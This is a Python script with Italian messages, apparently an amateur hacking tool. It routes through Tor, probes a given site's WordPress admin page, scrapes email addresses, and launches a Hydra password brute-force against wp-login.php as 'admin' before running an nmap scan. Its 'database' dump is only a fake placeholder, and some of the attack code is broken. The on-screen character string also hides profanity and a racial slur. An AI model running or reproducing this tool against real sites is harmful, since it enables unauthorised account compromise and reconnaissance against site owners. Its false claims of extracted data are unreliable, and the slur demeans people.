import os
import subprocess
import requests
import re
import time
from bs4 import BeautifulSoup, Comment
import whois
import random
import sys
import sqlite3

def pulisci_schermo():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_matrix_effect(duration=5):
    columns = 80  
    rows = 24     
    chars = "ercazoercazzoercazzoerc4azzoercazzo3rc4zzoercazzonesucanegrodimerda1233909"

    end_time = time.time() + duration
    while time.time() < end_time:
        grid = [[' ' for _ in range(columns)] for _ in range(rows)]
        for y in range(rows):
            for x in range(columns):
                if random.random() < 0.1:
                    grid[y][x] = random.choice(chars)

        for row in grid:
            print('\033[92m' + ''.join(row) + '\033[0m')  # Stile Matrix verde
        sys.stdout.flush()
        time.sleep(0.1)
        pulisci_schermo()

def start_tor():
    print("Tor in avvio...")
    try:
        subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10)  
        print("Tor avviato correttamente.")
    except Exception as e:
        print(f"Errore durante l'avvio di Tor: {e}")

def install_tool(tool_name, install_command):
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{tool_name} è già installato.")
        return True
    except FileNotFoundError:
        print(f"{tool_name} non trovato. Installazione in corso...")
        try:
            subprocess.run(install_command, shell=True, check=True)
            print(f"{tool_name} installato correttamente.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"Errore durante l'installazione di {tool_name}: {e}")
            return False

def install_required_tools():
    install_tool('hydra', 'sudo apt-get install -y hydra')
    install_tool('git', 'sudo apt-get install -y git')
    install_tool('nmap', 'sudo apt-get install -y nmap')

    if not os.path.exists('HostHunter'):
        print("Clonazione di HostHunter da GitHub...")
        try:
            subprocess.run('git clone https://github.com/SpiderLabs/HostHunter.git', shell=True, check=True)
            print("HostHunter installato correttamente.")
        except subprocess.CalledProcessError as e:
            print(f"Errore durante la clonazione di HostHunter: {e}")
    else:
        print("HostHunter è già presente.")

def find_admin_page(url):
    headers = {"User -Agent": "Mozilla/5.0"}
    try:
        response = requests.get(f"http://{url}/wp-admin/", headers=headers, timeout=5)
        if response.status_code == 200:
            print("\nPagina Admin trovata!")
            print(f"URL: {response.url}")

            soup = BeautifulSoup(response.text, 'html.parser')
            emails = set(re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text))
            print("\nEmail trovate:")
            for email in emails:
                print(email)

            html_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_admin.html")
            with open(html_file_path, 'w') as file:
                file.write(response.text)
            print(f"Pagina admin salvata in {html_file_path}")

            save_database_to_txt(url)

            brute_force_hydra(url, "/wp-login.php")
        else:
            print("Pagina Admin non trovata.")
    except Exception as e:
        print(f"Errore durante la ricerca della pagina admin: {e}")

def save_database_to_txt(url):
    database_content = "Simulazione dei dati del database estratti."
    try:
        txt_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_database.txt")
        with open(txt_file_path, 'w') as file:
            file.write(database_content)
        print(f"\nDatabase salvato in {txt_file_path}")
    except Exception as e:
        print(f"Errore durante il salvataggio del database: {e}")

def brute_force_hydra(url, login_path):
    print("\nInizio dell'attacco di forza bruta con Hydra...")
    try:
        subprocess.run(['hydra', '-l', 'admin', '-P', 'passwords.txt', url, 'http-get', login_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Attacco di forza bruta completato.")
    except Exception as e:
        print(f"Errore durante l'attacco di forza bruta: {e}")

def nmap_scan(ip):
    print("\nInizio della scansione con Nmap...")
    try:
        subprocess.run(['nmap', '-d1', '-d2', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Scansione con Nmap completata.")
    except Exception as e:
        print(f"Errore durante la scansione con Nmap: {e}")

def main():
    display_matrix_effect(5)
    start_tor()
    install_required_tools()
    url = input("Inserisci l'URL del sito web: ")
    find_admin_page(url)
    ip = input("Inserisci l'IP del sito web: ")
    nmap_scan(ip)

if __name__ == "__main__":
    main()
